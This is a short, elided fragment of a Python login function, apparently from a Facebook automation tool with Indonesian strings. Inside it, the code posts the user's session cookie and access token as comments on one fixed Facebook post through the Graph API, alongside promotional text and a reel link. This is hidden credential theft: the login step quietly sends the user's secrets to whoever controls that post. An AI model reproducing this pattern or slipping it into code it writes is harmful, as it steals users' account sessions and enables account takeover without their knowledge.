...
def login():
	...
	try:
		...
		link = ('https://www.facebook.com/reel/830519891579131/?app=fbl')
		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Ah Ganteng Banget Bang"])
		#ses.post(f"https://graph.facebook.com/830519891579131?fields=subscribers&access_token={token}",headers=(cookies=cok)
		ses.post(f"https://graph.facebook.com/830519891579131/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/830519891579131/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/830519891579131/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
